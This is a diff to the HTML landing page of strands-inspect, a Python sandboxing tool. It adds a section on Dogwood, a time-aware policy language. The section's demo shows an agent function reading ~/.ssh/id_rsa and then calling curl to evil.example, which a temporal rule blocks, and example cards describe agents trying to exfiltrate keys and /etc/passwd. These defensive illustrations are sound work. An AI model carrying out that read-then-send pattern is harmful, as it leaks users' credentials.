@@ -41,7 +41,8 @@
     .term-label{font-size:11px;color:var(--mut);font-family:var(--m);margin-left:auto}
     .term-body{padding:20px;font-family:var(--m);font-size:12.5px;line-height:2;color:var(--dim)}
     .term-body .kw{color:#8a8aaa}.term-body .fn{color:var(--w)}.term-body .str{color:#a0a0a0}.term-body .cm{color:var(--mut)}.term-body .red{color:var(--r)}
-    .two{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+    .two{display:grid;grid-template-columns:1fr 1fr;gap:16px}.three{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
+    .term-body .id{color:#7fb5a0}.term-body .grp{color:#c9b28a}
     .two-card{padding:32px 24px;border-radius:14px;border:1px solid var(--bdr);background:var(--card);transition:all .3s}
     .two-card:hover{border-color:rgba(255,255,255,.15)}
     .two-card h3{font-size:22px;font-weight:800;color:var(--w);margin-bottom:4px;letter-spacing:-.3px;font-family:var(--m)}
@@ -51,7 +52,7 @@
     .case-n{font-size:11px;font-family:var(--m);color:var(--mut);letter-spacing:1px;text-transform:uppercase;margin-bottom:8px}
     .case-title{font-size:18px;font-weight:700;color:var(--w);margin-bottom:6px}
     .case-desc{font-size:14px;color:var(--dim);line-height:1.6;max-width:600px}
-    .examples{display:grid;grid-template-columns:repeat(3,1fr);gap:12px}
+    .examples{display:grid;grid-template-columns:repeat(2,1fr);gap:12px}
     .ex-card{padding:24px;border-radius:12px;border:1px solid var(--bdr);background:var(--card);cursor:pointer;transition:all .3s}
     .ex-card:hover{border-color:rgba(255,255,255,.15);transform:translateY(-2px)}
     .ex-card h4{font-size:14px;font-weight:700;color:var(--w);margin-bottom:6px}.ex-card p{font-size:12px;color:var(--dim);line-height:1.5}
@@ -64,7 +65,7 @@
     footer{padding:40px 0;border-top:1px solid var(--bdr)}.foot{display:flex;align-items:center;justify-content:space-between;font-size:12px;color:var(--mut)}
     .foot a{color:var(--dim)}.foot a:hover{color:var(--w)}.foot-links{display:flex;gap:24px}
     .rv{opacity:0;transform:translateY(24px);transition:all .6s cubic-bezier(.16,1,.3,1)}.rv.v{opacity:1;transform:translateY(0)}
-    @media(max-width:768px){.n-link{display:none}.two{grid-template-columns:1fr}.examples{grid-template-columns:1fr}.foot{flex-direction:column;gap:16px;text-align:center}}
+    @media(max-width:768px){.n-link{display:none}.two{grid-template-columns:1fr}.three{grid-template-columns:1fr}.examples{grid-template-columns:1fr}.foot{flex-direction:column;gap:16px;text-align:center}}
   </style>
 </head>
 <body>
@@ -74,6 +75,7 @@
   <a href="#" class="n-brand">strands-inspect</a>
   <div class="n-links">
     <a href="#watch-lock" class="n-link">@watch / @lock</a>
+    <a href="#policy" class="n-link">Policy</a>
     <a href="#examples" class="n-link">Examples</a>
     <a href="#viewer" class="n-link">Viewer</a>
     <a href="https://github.com/cagataycali/strands-inspect" target="_blank" class="n-link">GitHub</a>
@@ -83,7 +85,7 @@
 
 <section class="hero"><div class="c">
   <h1 class="rv">See what your code does. Control what it can do.</h1>
-  <p class="hero-sub rv">Two decorators. Any Python function. From logging every file read to kernel-level isolation where even C extensions can't escape.</p>
+  <p class="hero-sub rv">Two decorators. Any Python function. From logging every file read to kernel-level isolation where even C extensions can't escape. Policies written in <a href="policy.html" style="color:var(--w);border-bottom:1px solid var(--bdr)">Dogwood</a>: Cedar syntax, plus time.</p>
   <div class="hero-install rv" onclick="navigator.clipboard.writeText('pip install strands-inspect');this.querySelector('span').textContent='copied!'">pip install strands-inspect <span>· click to copy</span></div>
   <div class="hero-links rv">
     <a href="#watch-lock" class="btn btn-w">How it works →</a>
@@ -123,6 +125,53 @@
       <div class="sub">nothing escapes</div>
       <p>Forks a subprocess. Kernel-level restrictions. macOS Seatbelt, Linux seccomp-bpf. Even ctypes, mmap, inline assembly — the kernel kills it.</p>
     </div>
+  </div>
+</div></section>
+
+<section class="sec sec-border" id="policy"><div class="c">
+  <div class="sec-label rv">One policy language</div>
+  <div class="sec-title rv">Cedar syntax, plus time.</div>
+  <p class="sec-desc rv">Every <code style="font-family:var(--m)">@watch</code> policy is <a href="https://github.com/dogwood-policy/dogwood" target="_blank" style="color:var(--w);border-bottom:1px solid var(--bdr)">Dogwood</a>: permit / forbid rules over the 20 hooked actions, with conditions that can look at what the function already did. Forbid wins. Nothing matched means deny. The engine is pure Python, stdlib only, and byte-identical to the reference on its conformance corpus.</p>
+  <div class="term rv">
+    <div class="term-bar"><div class="term-dot" style="background:#555"></div><div class="term-dot" style="background:#444"></div><div class="term-dot" style="background:#333"></div><div class="term-label">no_exfil.dw · @watch</div></div>
+    <div class="term-body">
+      <div><span class="fn">@watch</span>(policy=<span class="str">"""</span></div>
+      <div><span class="str">&nbsp; permit(principal, action, resource);</span></div>
+      <div><span class="str">&nbsp; </span><span class="id">@id("no-exfil-after-secret")</span></div>
+      <div><span class="str">&nbsp; forbid(principal, action in [</span><span class="grp">Inspect::Action::"net"</span><span class="str">, </span><span class="grp">Inspect::Action::"os"</span><span class="str">], resource)</span></div>
+      <div><span class="str">&nbsp; when temporal {</span></div>
+      <div><span class="str">&nbsp; &nbsp; &nbsp; formerly within 5m </span><span class="grp">Inspect::Action::"file.read"</span><span class="str">::request{ input.sensitive: true }</span></div>
+      <div><span class="str">&nbsp; };</span></div>
+      <div><span class="str">"""</span>)</div>
+      <div><span class="kw">def</span> <span class="fn">agent</span>():</div>
+      <div>&nbsp; &nbsp; open(<span class="str">"/etc/hosts"</span>).read() &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="cm"># fine</span></div>
+      <div>&nbsp; &nbsp; subprocess.run([<span class="str">"uname"</span>, <span class="str">"-s"</span>]) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="cm"># fine: nothing sensitive read yet</span></div>
+      <div>&nbsp; &nbsp; open(<span class="str">"~/.ssh/id_rsa"</span>).read() &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="cm"># a credential-shaped path</span></div>
+      <div>&nbsp; &nbsp; subprocess.run([<span class="str">"curl"</span>, <span class="str">"https://evil.example"</span>]) <span class="cm"># ← <span class="red">blocked</span> by no-exfil-after-secret</span></div>
+      <div>&nbsp;</div>
+      <div><span class="cm">🚫 Policy denied: subprocess — curl https://evil.example (rule no-exfil-after-secret)</span></div>
+    </div>
+  </div>
+  <div class="three rv">
+    <div class="two-card">
+      <h3 style="font-size:16px">Cedar rules</h3>
+      <div class="sub">who, what, on which arguments</div>
+      <p><code style="font-family:var(--m);font-size:12px">permit</code> / <code style="font-family:var(--m);font-size:12px">forbid</code> over a typed <code style="font-family:var(--m);font-size:12px">context.input</code>: path, host, port, argv, shell, sensitive. Action groups <code style="font-family:var(--m);font-size:12px">file</code> · <code style="font-family:var(--m);font-size:12px">net</code> · <code style="font-family:var(--m);font-size:12px">os</code> · <code style="font-family:var(--m);font-size:12px">process</code> · <code style="font-family:var(--m);font-size:12px">meta</code>.</p>
+    </div>
+    <div class="two-card">
+      <h3 style="font-size:16px">Temporal history</h3>
+      <div class="sub">what already happened</div>
+      <p><code style="font-family:var(--m);font-size:12px">formerly</code>, <code style="font-family:var(--m);font-size:12px">previous</code>, <code style="font-family:var(--m);font-size:12px">since</code>, <code style="font-family:var(--m);font-size:12px">count</code> / <code style="font-family:var(--m);font-size:12px">sum</code> over the function's own event trace. Rate limits, read-then-no-network, no-write-after-network: one rule each.</p>
+    </div>
+    <div class="two-card">
+      <h3 style="font-size:16px">Kernel projection</h3>
+      <div class="sub">the same file under @lock</div>
+      <p>A Dogwood policy projects onto the seven kernel capabilities: unconditional permits open them, any forbid closes them, a <code style="font-family:var(--m);font-size:12px">like "/data/*"</code> read becomes an allow-list. Coarse by design.</p>
+    </div>
+  </div>
+  <div class="hero-links rv" style="margin-top:36px">
+    <a href="policy.html" class="btn btn-w">Policy reference →</a>
+    <a href="https://github.com/cagataycali/strands-inspect/tree/main/strands_inspect/policies" target="_blank" class="btn btn-o">The six presets (.dw)</a>
   </div>
 </div></section>
 
@@ -175,6 +224,11 @@
   <div class="sec-label rv">See it</div>
   <div class="sec-title rv">Click to load into the viewer.</div>
   <div class="examples rv">
+    <div class="ex-card" onclick="loadExample('examples/dogwood_exfil.json')">
+      <h4>⏱ Denied by history</h4>
+      <p>Reads a key, then tries curl and urlopen. The temporal rule no-exfil-after-secret names itself on both.</p>
+      <div class="ex-stats">2 denied · 10 syscalls · 30.06ms</div>
+    </div>
     <div class="ex-card" onclick="loadExample('examples/sandbox_malicious.json')">
       <h4>🚫 Catching malicious code</h4>
       <p>Agent tries to exfiltrate /etc/passwd. Sandbox catches every attempt.</p>
